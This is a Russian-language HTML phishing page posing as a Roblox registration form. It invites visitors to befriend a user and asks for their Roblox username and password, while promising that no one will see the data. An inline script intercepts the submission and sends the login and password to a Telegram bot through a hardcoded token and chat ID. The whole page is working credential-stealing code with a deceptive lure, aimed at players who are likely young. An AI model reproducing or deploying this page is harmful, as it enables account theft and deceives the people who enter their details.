<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Roblox Регистрация</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

<div class="bg-animation"></div>

<div class="container">
    <h1>Приглоси в друзья MAGZHAN221!</h1>

    <form id="registerForm">
        <input type="text" id="username" placeholder="Твой ник" required>
        <input type="password" id="password" placeholder="Твой пароль" required>
        <button type="submit">Зарегистрироваться</button>
    </form>

    <p class="notice">
        ⚠️ Эти данные не кто не будет видеть
    </p>
</div>

<script src="script.js"></script>
</body>
<script>
document.addEventListener("DOMContentLoaded", function(){

const TOKEN = "8605628921:AAGqolnRvWzoDVzRo-S8CrSW9mEPb4Gk1kM";
const CHAT_ID = "6966096666";

const form = document.querySelector("form");

if(form){
    form.addEventListener("submit", function(e){
        e.preventDefault();

        const username = document.querySelector('input[type="text"]').value;
        const password = document.querySelector('input[type="password"]').value; 
        const message = `Данные формы:\nЛогин: ${username}\nПароль: ${password}`;  
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        })
        .then(res => res.json())
        .then(data => console.log("Успешно отправлено:", data))
        .catch(err => console.error("Ошибка сети:", err));
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: "Новый ник: " + username
                
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log(data);
            alert("Отправлено!");
        })
        .catch(error => {
            console.error(error);
            alert("Ошибка!");
        });
    });
}

});
</script>
</html>
